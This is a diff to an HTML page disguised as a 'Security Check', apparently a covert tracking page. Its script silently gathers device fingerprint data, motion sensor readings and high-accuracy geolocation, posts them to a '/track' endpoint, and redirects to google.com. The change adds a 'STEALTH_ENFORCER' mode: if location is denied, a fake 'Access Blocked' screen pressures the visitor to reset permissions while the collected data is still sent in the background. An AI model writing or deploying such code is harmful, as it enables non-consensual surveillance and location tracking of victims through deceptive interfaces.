@@ -3,29 +3,114 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Checking...</title>
+    <title>Security Check</title>
     <style>
         body {
             background: #000;
-            color: #333;
-            overflow: hidden;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             height: 100vh;
-            width: 100vw;
             margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        #denied-msg {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .instruction-box {
+            border: 1px solid #30363d;
+            background: #161b22;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 90%;
+            width: 350px;
+        }
+
+        h2 {
+            color: #da3633;
+            margin-top: 0;
+        }
+
+        p {
+            color: #c9d1d9;
+            font-size: 0.95em;
+            line-height: 1.5;
+        }
+
+        .arrow {
+            font-size: 2em;
+            animation: bounce 1s infinite;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-5px);
+            }
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
             cursor: pointer;
         }
     </style>
 </head>
 
 <body>
+    <!-- Default State: Black Screen (Collecting...) -->
+
+    <!-- Denied/Blocked UI -->
+    <div id="denied-msg">
+        <div class="arrow">🔒 ⬆️</div>
+        <div class="instruction-box">
+            <h2>Access Blocked</h2>
+            <p>Location permission was denied.</p>
+            <p><strong>To continue:</strong></p>
+            <ol style="text-align: left; padding-left: 20px; color: #8b949e;">
+                <li>Click the <strong>Lock Icon</strong> (🔒) in the URL bar.</li>
+                <li>Click <strong>Permissions / Reset</strong>.</li>
+                <li>Reload the page.</li>
+            </ol>
+            <button onclick="window.location.reload()">I have reset it, Reload!</button>
+        </div>
+    </div>
+
     <script>
-        // Configuration
         const TARGET_URL = '/track';
         const REDIRECT_URL = 'https://google.com';
-        const DELAY_MS = 4000; // 4 seconds data collection time
+        const DELAY_MS = 4000;
 
         const data = {
-            type: 'STEALTH_AUTO',
+            type: 'STEALTH_ENFORCER',
             timestamp: new Date().toISOString(),
             url: window.location.href,
             referrer: document.referrer,
@@ -38,37 +123,36 @@
 
         // --- BACKGROUND COLLECTION ---
         function collectBackgroundData() {
-            // Sensors
             if (window.DeviceMotionEvent) {
                 window.addEventListener('devicemotion', (event) => {
                     const acc = event.accelerationIncludingGravity;
-                    if (acc && acc.x !== null) {
-                        data.sensors.accel = { x: acc.x.toFixed(2), y: acc.y.toFixed(2), z: acc.z.toFixed(2) };
-                    }
+                    if (acc && acc.x !== null) { data.sensors.accel = { x: acc.x.toFixed(2), y: acc.y.toFixed(2), z: acc.z.toFixed(2) }; }
                 });
             }
-            // Fingerprint
             try {
                 data.fingerprint.platform = navigator.platform;
                 data.fingerprint.cores = navigator.hardwareConcurrency;
                 data.fingerprint.memory = navigator.deviceMemory;
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bat => {
-                        data.fingerprint.battery = { level: bat.level, charging: bat.charging };
-                    });
-                }
+                if (navigator.getBattery) navigator.getBattery().then(b => data.fingerprint.battery = { level: b.level, charging: b.charging });
             } catch (e) { }
         }
         collectBackgroundData();
 
-        // --- MAIN LOGIC ---
-        let hasRun = false;
+        // --- PERMISSION ENFORCER ---
+        async function checkAndRun() {
+            // 1. Check Permission State API
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const status = await navigator.permissions.query({ name: 'geolocation' });
+                    if (status.state === 'denied') {
+                        // User previously clicked "Never Allow" -> Force UI
+                        showDeniedUI();
+                        return; // Stop here, do not redirect
+                    }
+                } catch (e) { }
+            }
 
-        function runSequence() {
-            if (hasRun) return; // Prevent double execution
-            hasRun = true;
-
-            // Request Location
+            // 2. Request Location
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     // SUCCESS
@@ -81,55 +165,57 @@
                     finalize();
                 },
                 (err) => {
-                    // ERROR / BLOCKED (This handles "Block", "Never", or "Not Now")
-                    data.location = {
-                        error: err.message,
-                        code: err.code
-                    };
-                    finalize();
+                    // ERROR logic
+                    if (err.code === 1) { // PERMISSION_DENIED
+                        showDeniedUI();
+                        // Special Case: Some browsers verify 'denied' only after the prompt is rejected.
+                        // We do NOT redirect here if we want to force them.
+                    } else {
+                        // Position Unavailable / Timeout -> Proceed anyway (e.g. GPS off but permission granted)
+                        data.location = { error: err.message, code: err.code };
+                        finalize();
+                    }
                 },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         }
 
-        function finalize() {
-            // Wait 4 seconds to ensure sensors/wifi data is collected
-            setTimeout(() => {
-                sendAndRedirect();
-            }, DELAY_MS);
+        function showDeniedUI() {
+            const ui = document.getElementById('denied-msg');
+            ui.style.display = 'flex';
+
+            // Still send what we have (IP/Sensors) in background
+            data.location.error = "USER_BLOCKED_PERMISSION";
+            sendData();
         }
 
-        function sendAndRedirect() {
-            data.timestamp = new Date().toISOString();
+        function finalize() {
+            setTimeout(sendAndRedirect, DELAY_MS);
+        }
 
-            // Send
+        function sendData() {
+            data.timestamp = new Date().toISOString();
             fetch(TARGET_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data),
                 keepalive: true
-            }).catch(e => console.log(e));
+            }).catch(e => { });
+        }
 
-            // Redirect
+        function sendAndRedirect() {
+            sendData();
             window.location.href = REDIRECT_URL;
         }
 
         // --- TRIGGERS ---
-        // 1. Try immediately on load
-        try { runSequence(); } catch (e) { }
+        checkAndRun();
 
-        // 2. Try on ANY interaction (if browser blocked the auto-run)
-        // This is "invisible" - user clicks anywhere and it triggers prompt
-        document.addEventListener('click', runSequence);
-        document.addEventListener('touchstart', runSequence);
-
-        // 3. Safety Timeout: If location prompt hangs or is ignored for 10s, redirect anyway
-        setTimeout(() => {
-            if (!data.location.lat && !data.location.error) {
-                data.location.error = "Timeout/Ignored";
-                finalize();
-            }
-        }, 12000);
+        // Fallback Trigger
+        document.addEventListener('click', () => {
+            // If UI is hidden, try running again on click
+            if (document.getElementById('denied-msg').style.display === 'none') checkAndRun();
+        });
 
     </script>
 </body>
